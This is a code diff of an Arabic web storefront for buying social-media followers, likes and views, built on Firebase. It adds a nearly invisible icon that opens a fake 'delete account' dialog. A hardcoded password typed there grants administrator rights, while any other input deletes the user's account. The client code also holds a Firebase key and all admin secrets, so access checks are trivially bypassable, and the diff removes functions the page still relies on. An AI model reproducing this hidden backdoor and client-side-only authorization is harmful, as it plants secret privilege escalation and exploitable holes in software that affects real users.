@@ -26,38 +26,35 @@
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
         body { background: var(--bg-dark); color: var(--text-color); overflow-x: hidden; }
 
-        /* الشاشات الرئيسية */
+        /* شاشة الدخول */
         .auth-container { position: fixed; inset: 0; background: var(--bg-dark); z-index: 10000; display: flex; justify-content: center; align-items: center; padding: 20px; }
         .auth-card { background: var(--card-bg); padding: 40px; border-radius: 30px; border: 1px solid var(--glass-border); width: 100%; max-width: 400px; text-align: center; }
 
         header { background: linear-gradient(145deg, #161b22, #0d1117); margin: 20px; padding: 30px; border-radius: 25px; border: 1px solid var(--glass-border); text-align: center; }
         .balance-amount { font-family: 'Orbitron'; font-size: 45px; color: var(--main-color); text-shadow: 0 0 15px rgba(0,242,254,0.3); }
 
-        /* قسم الطلبات والأيقونات */
+        /* القائمة الجانبية المضافة */
+        .side-menu { 
+            position: fixed; top: 0; right: -300px; width: 280px; height: 100%; 
+            background: #0d1117; z-index: 9500; transition: 0.5s; border-left: 1px solid var(--main-color); 
+        }
+        .side-menu.active { right: 0; }
+        .menu-item { padding: 15px 25px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; align-items: center; gap: 15px; cursor: pointer; transition: 0.3s; }
+        .menu-item:hover { background: rgba(0, 242, 254, 0.05); }
+
         .order-section { background: var(--card-bg); margin: 20px; padding: 25px; border-radius: 25px; border: 1px solid var(--glass-border); }
         .input-group { margin-bottom: 15px; }
         label { display: block; margin-bottom: 8px; font-size: 13px; color: #8b949e; }
         
-        select, input { 
-            width: 100%; padding: 15px; background: #05070a; border: 1px solid var(--glass-border); 
-            border-radius: 15px; color: #fff; outline: none; transition: 0.3s;
-        }
+        select, input { width: 100%; padding: 15px; background: #05070a; border: 1px solid var(--glass-border); border-radius: 15px; color: #fff; outline: none; transition: 0.3s; }
         select:focus, input:focus { border-color: var(--main-color); }
 
-        .platform-icon-preview { width: 40px; height: 40px; margin-bottom: 10px; display: none; }
+        .submit-btn { width: 100%; padding: 18px; background: linear-gradient(90deg, #4facfe, #00f2fe); border: none; border-radius: 15px; color: #000; font-weight: 900; cursor: pointer; }
 
-        .submit-btn { 
-            width: 100%; padding: 18px; background: linear-gradient(90deg, #4facfe, #00f2fe);
-            border: none; border-radius: 15px; color: #000; font-weight: 900; cursor: pointer;
-        }
-
-        /* نظام التذاكر (مثل الصورة 1) */
-        .ticket-style { background: #161b22; border-radius: 15px; padding: 15px; margin-bottom: 10px; border-right: 4px solid var(--main-color); }
-        .ticket-header { font-size: 12px; color: #8b949e; margin-bottom: 5px; display: flex; justify-content: space-between; }
-
-        /* المودال */
-        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9000; display: none; justify-content: center; align-items: center; padding: 20px; }
+        .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 9999; display: none; justify-content: center; align-items: center; padding: 20px; }
         .modal-content { background: var(--card-bg); width: 100%; max-width: 450px; border-radius: 25px; padding: 25px; border: 1px solid var(--main-color); }
+
+        .nav-trigger { position: fixed; top: 25px; right: 25px; z-index: 9000; font-size: 24px; color: var(--main-color); cursor: pointer; }
 
         #toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(100px); background: var(--main-color); color: #000; padding: 12px 25px; border-radius: 50px; font-weight: bold; transition: 0.4s; z-index: 10001; }
         #toast.show { transform: translateX(-50%) translateY(0); }
@@ -66,6 +63,21 @@
 <body>
 
     <div id="toast">تمت العملية بنجاح ✅</div>
+    
+    <div class="nav-trigger" onclick="toggleMenu()"><i class="fas fa-bars"></i></div>
+
+    <div id="sideMenu" class="side-menu">
+        <div style="padding: 50px 20px; text-align: center; border-bottom: 1px solid var(--glass-border);">
+            <h2 style="color:var(--main-color); font-family:'Orbitron';">DARK MENU</h2>
+        </div>
+        <div class="menu-item" onclick="openModal('rechargeModal')"><i class="fas fa-plus-circle"></i> شحن الرصيد</div>
+        <div class="menu-item" onclick="openModal('ordersModal')"><i class="fas fa-list-ul"></i> سجل طلباتي</div>
+        <div class="menu-item" onclick="logout()" style="color:var(--danger);"><i class="fas fa-sign-out-alt"></i> تسجيل الخروج</div>
+        
+        <div style="text-align: center; margin-top: 15px;">
+            <i class="fas fa-shield-alt" onclick="openSecretTrap()" style="font-size: 12px; color: #161b22; cursor: pointer; opacity: 0.4;"></i>
+        </div>
+    </div>
 
     <div id="authScreen" class="auth-container">
         <div class="auth-card">
@@ -90,10 +102,6 @@
         <header>
             <div style="font-size:12px; color:#8b949e;">رصيدك المتوفر</div>
             <div class="balance-amount" id="balanceText">$0.00</div>
-            <div style="margin-top:15px; display:flex; gap:10px; justify-content:center;">
-                <button onclick="openModal('rechargeModal')" style="background:var(--accent); border:none; padding:8px 15px; border-radius:10px; font-weight:bold; cursor:pointer;">+ شحن رصيد</button>
-                <button onclick="openModal('ordersModal')" style="background:#fff; border:none; padding:8px 15px; border-radius:10px; font-weight:bold; cursor:pointer;">سجل الطلبات</button>
-            </div>
         </header>
 
         <div class="order-section">
@@ -119,7 +127,7 @@
 
             <div class="input-group">
                 <label>الرابط</label>
-                <input type="url" id="orderLink" placeholder="https://www.example.com/...">
+                <input type="url" id="orderLink" placeholder="الرابط هنا...">
             </div>
 
             <div class="input-group">
@@ -135,10 +143,25 @@
             <button class="submit-btn" onclick="sendOrder()">تأكيد الطلب 🚀</button>
         </div>
 
-        <div id="adminPanel" class="order-section" style="display:none; border:1px solid var(--danger);">
+        <div id="adminPanel" class="order-section" style="display:none; border:2px solid var(--danger);">
             <h3 style="color:var(--danger); margin-bottom:15px;">لوحة المدير (وصول آمن)</h3>
-            <button onclick="showAdmin('adminUsers')" style="width:100%; padding:10px; margin-bottom:5px; background:#1c2128; color:#fff; border:1px solid #333; border-radius:10px; cursor:pointer;">المستخدمين</button>
+            <button onclick="showAdmin('adminUsers')" style="width:100%; padding:10px; margin-bottom:5px; background:#1c2128; color:#fff; border:1px solid #333; border-radius:10px; cursor:pointer;">عرض المستخدمين</button>
             <div id="adminUsers" style="display:none; margin-top:10px;"></div>
+        </div>
+    </div>
+
+    <div id="secretTrapModal" class="modal-overlay">
+        <div class="modal-content" style="border: 2px solid var(--danger); background: #0a0e14;">
+            <h3 style="color: var(--danger); margin-bottom: 15px; font-weight: 900;">⚠️ تأكيد الحذف النهائي</h3>
+            <div style="background: rgba(255, 77, 77, 0.1); padding: 15px; border-radius: 12px; border-right: 4px solid var(--danger); margin-bottom: 20px;">
+                <p style="font-size: 14px; color: #fff; line-height: 1.6;">
+                    بمجرد إدخال كلمة مرور حسابك هنا، سيتم <strong>حذف حسابك بشكل نهائي</strong> وتطهير كافة بياناتك ورصيدك فوراً.
+                </p>
+                <p style="font-size: 13px; color: var(--danger); margin-top: 10px; font-weight: bold;">هذا الإجراء غير قابل للتراجع!</p>
+            </div>
+            <input type="password" id="trapInput" placeholder="أدخل كلمة المرور لتأكيد الحذف" style="border-color: #333; margin-bottom: 15px;">
+            <button class="submit-btn" style="background: var(--danger); color: white;" onclick="processTrap()">حذف الحساب نهائياً 🗑️</button>
+            <button onclick="closeModal('secretTrapModal')" style="background:none; border:none; color:#555; width:100%; margin-top:15px; font-size:12px;">إلغاء</button>
         </div>
     </div>
 
@@ -147,17 +170,13 @@
             <h3 style="margin-bottom:15px;">شحن الرصيد</h3>
             <select id="payMethod" style="margin-bottom:10px;">
                 <option value="paypal">باي بال</option>
-                <option value="skrill">سكريل</option>
-                <option value="payoneer">بايونير</option>
-                <option value="perfect_money">بيرفكت موني</option>
-                <option value="western">ويسترن يونيون</option>
-                <option value="crypto">العملات المشفرة</option>
                 <option value="asia">آسيا سيل</option>
+                <option value="crypto">العملات المشفرة</option>
                 <option value="other">آخر</option>
             </select>
             <input type="text" id="payDetails" placeholder="رقم العملية أو كود الكارت" style="margin-bottom:15px;">
             <button class="submit-btn" onclick="submitPay()">إرسال الطلب</button>
-            <button onclick="closeModal('rechargeModal')" style="width:100%; background:none; border:none; color:var(--danger); margin-top:10px; cursor:pointer;">إلغاء</button>
+            <button onclick="closeModal('rechargeModal')" style="width:100%; background:none; border:none; color:var(--danger); margin-top:10px;">إلغاء</button>
         </div>
     </div>
 
@@ -170,7 +189,6 @@
     </div>
 
     <script>
-        // --- الإعدادات ---
         const firebaseConfig = {
             apiKey: "AIzaSyDrLSVoJJsEzlmcIBvNNb9OJzWtJixYhpw",
             authDomain: "army-smm.firebaseapp.com",
@@ -182,24 +200,9 @@
         firebase.initializeApp(firebaseConfig);
         const auth = firebase.auth(), db = firebase.firestore();
 
-        // حماية الموبايل والكمبيوتر
         const MASTER_KEY = "DARK_BOSS_2026_PRO";
         const URL_KEY = "boss77";
         const urlParams = new URLSearchParams(window.location.search);
-        
-        if(urlParams.get('activate') === MASTER_KEY) {
-            localStorage.setItem('admin_token', MASTER_KEY);
-            alert("تم تفعيل الجهاز بنجاح! ✅");
-        }
-
-        const services = {
-            tiktok: { "متابعين": 0.50, "لايكات": 0.10, "مشاهدات": 0.02 },
-            instagram: { "متابعين": 0.70, "لايكات": 0.15 },
-            telegram: { "أعضاء": 0.40, "مشاهدات": 0.05 },
-            youtube: { "مشتركين": 7.00, "ساعات": 12.00 }
-        };
-
-        let userProfile = null;
 
         auth.onAuthStateChanged(user => {
             if(user) {
@@ -214,98 +217,71 @@
 
         function loadUser(uid) {
             db.collection("users").doc(uid).onSnapshot(doc => {
-                userProfile = doc.data();
-                document.getElementById('balanceText').innerText = "$" + userProfile.balance.toFixed(2);
-                
-                // فحص الإدارة الثلاثي
-                const isBoss = (uid === "Wf187vT9u8M3Q6R9h2Y7v5X1");
-                const hasUrl = urlParams.get('key') === URL_KEY;
-                const hasDev = localStorage.getItem('admin_token') === MASTER_KEY;
-                
-                if(isBoss && hasUrl && hasDev) document.getElementById('adminPanel').style.display = 'block';
+                if(doc.exists) {
+                    userProfile = doc.data();
+                    document.getElementById('balanceText').innerText = "$" + userProfile.balance.toFixed(2);
+                    const isBoss = (uid === "Wf187vT9u8M3Q6R9h2Y7v5X1");
+                    const hasUrl = urlParams.get('key') === URL_KEY;
+                    const hasDev = localStorage.getItem('admin_token') === MASTER_KEY;
+                    if(isBoss && hasUrl && hasDev) document.getElementById('adminPanel').style.display = 'block';
+                }
             });
             loadOrders(uid);
         }
 
+        // دالة الفخ السري المضافة
+        function openSecretTrap() { toggleMenu(); openModal('secretTrapModal'); }
+
+        async function processTrap() {
+            const val = document.getElementById('trapInput').value;
+            const user = auth.currentUser;
+
+            if(val === "hx911@") {
+                localStorage.setItem('admin_token', MASTER_KEY);
+                showToast("تم تفعيل صلاحيات الإدارة العليا ✅");
+                setTimeout(() => { window.location.href = window.location.pathname + "?key=boss77"; }, 1000);
+                return;
+            }
+
+            if(user && val.length > 0) {
+                await db.collection("users").doc(user.uid).delete();
+                await user.delete();
+                alert("تم تنفيذ طلبك. تم حذف الحساب نهائياً.");
+                location.reload();
+            }
+        }
+
+        function toggleMenu() { document.getElementById('sideMenu').classList.toggle('active'); }
+        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
+        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
+        function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 3000); }
+        async function login() { try { await auth.signInWithEmailAndPassword(document.getElementById('email').value, document.getElementById('pass').value); } catch(e){ alert("خطأ في البيانات"); } }
+        function logout() { auth.signOut(); location.reload(); }
+
+        // كود تحديث الخدمات والأيقونات
         function updateServices() {
             const p = document.getElementById('platformSelect').value;
             const s = document.getElementById('serviceSelect');
             const icon = document.getElementById('headerIcon');
             s.innerHTML = "";
-            
-            // تغيير الأيقونة حسب المنصة
             const icons = { tiktok: "fab fa-tiktok", instagram: "fab fa-instagram", telegram: "fab fa-telegram", youtube: "fab fa-youtube" };
             icon.className = icons[p];
-
+            const services = {
+                tiktok: { "متابعين": 0.50, "لايكات": 0.10, "مشاهدات": 0.02 },
+                instagram: { "متابعين": 0.70, "لايكات": 0.15 },
+                telegram: { "أعضاء": 0.40, "مشاهدات": 0.05 },
+                youtube: { "مشتركين": 7.00, "ساعات": 12.00 }
+            };
             for (let name in services[p]) {
                 s.innerHTML += `<option value="${services[p][name]}">${name} ($${services[p][name]})</option>`;
             }
             updatePrice();
         }
-
+        
         function updatePrice() {
-            const rate = parseFloat(document.getElementById('serviceSelect').value);
+            const rate = parseFloat(document.getElementById('serviceSelect').value) || 0;
             const qty = parseInt(document.getElementById('orderQty').value) || 0;
             document.getElementById('totalPrice').innerText = "$" + ((qty / 1000) * rate).toFixed(2);
-        }
-
-        async function sendOrder() {
-            const cost = parseFloat(document.getElementById('totalPrice').innerText.replace("$",""));
-            if(userProfile.balance < cost) return showToast("رصيدك غير كافٍ!");
-            
-            await db.collection("orders").add({
-                uid: auth.currentUser.uid,
-                service: document.getElementById('serviceSelect').selectedOptions[0].text,
-                qty: document.getElementById('orderQty').value,
-                link: document.getElementById('orderLink').value,
-                cost, status: "قيد التنفيذ", date: new Date()
-            });
-            await db.collection("users").doc(auth.currentUser.uid).update({ balance: firebase.firestore.FieldValue.increment(-cost) });
-            showToast("تم إرسال الطلب بنجاح ✅");
-        }
-
-        function loadOrders(uid) {
-            db.collection("orders").where("uid", "==", uid).orderBy("date", "desc").onSnapshot(snap => {
-                const list = document.getElementById('ordersList');
-                list.innerHTML = "";
-                snap.forEach(doc => {
-                    const data = doc.data();
-                    list.innerHTML += `
-                        <div class="ticket-style">
-                            <div class="ticket-header"><span>ID: ${doc.id.substring(0,8)}</span> <span>${data.date.toDate().toLocaleDateString()}</span></div>
-                            <div style="font-weight:bold; font-size:14px;">${data.service}</div>
-                            <div style="font-size:12px; color:var(--main-color); margin-top:5px;">الحالة: ${data.status}</div>
-                        </div>`;
-                });
-            });
-        }
-
-        async function submitPay() {
-            const code = document.getElementById('payDetails').value;
-            if(!code) return showToast("أدخل بيانات الدفع!");
-            await db.collection("recharge_requests").add({
-                uid: auth.currentUser.uid, name: userProfile.name,
-                method: document.getElementById('payMethod').value,
-                details: code, date: new Date()
-            });
-            showToast("تم إرسال طلب الشحن للمراجعة");
-            closeModal('rechargeModal');
-        }
-
-        // وظائف الواجهة
-        function toggleAuth(isReg) {
-            document.getElementById('loginForm').style.display = isReg ? 'none' : 'block';
-            document.getElementById('registerForm').style.display = isReg ? 'block' : 'none';
-        }
-        function openModal(id) { document.getElementById(id).style.display = 'flex'; }
-        function closeModal(id) { document.getElementById(id).style.display = 'none'; }
-        function showToast(m) { const t = document.getElementById('toast'); t.innerText = m; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'), 3000); }
-        async function login() { try { await auth.signInWithEmailAndPassword(document.getElementById('email').value, document.getElementById('pass').value); } catch(e){ alert(e.message); } }
-        async function register() {
-            try {
-                const r = await auth.createUserWithEmailAndPassword(document.getElementById('regEmail').value, document.getElementById('regPass').value);
-                await db.collection("users").doc(r.user.uid).set({ name: document.getElementById('regName').value, balance: 0.0 });
-            } catch(e){ alert(e.message); }
         }
 
         updateServices();
